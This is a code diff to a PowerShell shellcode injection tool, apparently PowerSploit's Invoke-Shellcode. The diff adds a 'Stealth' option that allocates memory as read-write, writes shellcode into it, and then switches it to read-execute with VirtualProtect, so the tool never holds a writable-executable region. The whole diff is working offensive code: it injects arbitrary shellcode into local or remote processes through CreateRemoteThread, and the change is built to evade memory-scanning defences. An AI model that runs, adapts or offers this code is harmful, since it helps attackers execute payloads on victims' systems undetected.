@@ -27,7 +27,11 @@ Process ID of the process you want to inject shellcode into.
 
 .PARAMETER Shellcode
 
-Specifies an optional shellcode passed in as a byte array
+Specifies an optional shellcode passed in as a byte array.
+
+.PARAMETER Stealth
+
+First allocate memory with RW permissions via the VirtualAlloc() Windows API function and then change memory permissions to RX via VirtualProtect().
 
 .PARAMETER Force
 
@@ -73,6 +77,9 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         [ValidateNotNullOrEmpty()]
         [Byte[]]
         $Shellcode,
+
+        [Switch]
+        $Stealth = $False,
 
         [Switch]
         $Force = $False
@@ -241,8 +248,15 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         }
 
         # Reserve and commit enough memory in remote process to hold the shellcode
-        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
-
+        if ($Stealth)
+        {
+            $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x04) # (Reserve|Commit, RW)
+        }
+        else
+        {
+            $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        }
+        
         if (!$RemoteMemAddr)
         {
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
@@ -252,6 +266,16 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 
         # Copy shellcode into the previously allocated memory
         $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null
+
+        if ($Stealth)
+        {
+            # Change memory permissions from RW to RX
+            $RetVal = $VirtualProtectEx.Invoke($hProcess, $RemoteMemAddr, $Shellcode.Length + 1, 0x20, [Ref]0) # RX
+            if (!$RetVal)
+            {
+                Throw "Unable to change memory permissions from RW to RX."
+            }
+        }
 
         # Get address of ExitThread function
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
@@ -272,8 +296,15 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         }
 
         # Allocate inline assembly stub
-        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
-
+        if ($Stealth)
+        {
+            $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x04) # (Reserve|Commit, RW)
+        }
+        else
+        {
+            $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        }
+        
         if (!$RemoteStubAddr)
         {
             Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
@@ -283,6 +314,16 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 
         # Write 32-bit assembly stub to remote process memory space
         $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null
+
+        if ($Stealth)
+        {
+            # Change memory permissions from RW to RX
+            $RetVal = $VirtualProtectEx.Invoke($hProcess, $RemoteStubAddr, $CallStub.Length + 1, 0x20, [Ref]0) # RX
+            if (!$RetVal)
+            {
+                Throw "Unable to change memory permissions from RW to RX."
+            }
+        }
 
         # Execute shellcode as a remote thread
         $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
@@ -322,8 +363,17 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
             Write-Verbose 'Using 64-bit shellcode.'
         }
 
-        # Allocate RWX memory for the shellcode
-        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if ($Stealth)
+        {
+            # Allocate RW memory for the shellcode
+            $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x04) # (Reserve|Commit, RW)
+        }
+        else
+        {
+            # Allocate RWX memory for the shellcode
+            $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        }
+
         if (!$BaseAddress)
         {
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
@@ -331,8 +381,18 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 
         Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
 
-        # Copy shellcode to RWX buffer
+        # Copy shellcode to RW(X) buffer
         [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
+
+        if ($Stealth)
+        {
+            # Change memory permissions from RW to RX
+            $RetVal = $VirtualProtect.Invoke($BaseAddress, $Shellcode.Length + 1, 0x20, [Ref]0) # RX
+            if (!$RetVal)
+            {
+                Throw "Unable to change memory permissions from RW to RX."
+            }
+        }
 
         # Get address of ExitThread function
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
@@ -350,8 +410,17 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
             Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
 
-        # Allocate RWX memory for the thread call stub
-        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        if ($Stealth)
+        {
+            # Allocate RW memory for the thread call stub
+            $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x04) # (Reserve|Commit, RW)
+        }
+        else 
+        {
+            # Allocate RWX memory for the thread call stub
+            $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        }
+
         if (!$CallStubAddress)
         {
             Throw "Unable to allocate thread call stub."
@@ -359,10 +428,20 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 
         Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"
 
-        # Copy call stub to RWX buffer
+        # Copy call stub to RW(X) buffer
         [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)
 
-        # Launch shellcode in it's own thread
+        if ($Stealth)
+        {
+            # Change memory permissions from RW to RX
+            $RetVal = $VirtualProtect.Invoke($CallStubAddress, $CallStub.Length + 1, 0x20, [Ref]0) # RX
+            if (!$RetVal)
+            {
+                Throw "Unable to change memory permissions from RW to RX."
+            }
+        }
+
+        # Launch shellcode in its own thread
         $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
         if (!$ThreadHandle)
         {
@@ -473,6 +552,9 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
         $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
         $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
+        $VirtualProtectExAddr = Get-ProcAddress kernel32.dll VirtualProtectEx
+        $VirtualProtectExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+        $VirtualProtectEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectExAddr, $VirtualProtectExDelegate)
         $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
         $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
@@ -497,6 +579,9 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
         $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
         $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
+        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
+        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
         $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
         $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
         $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
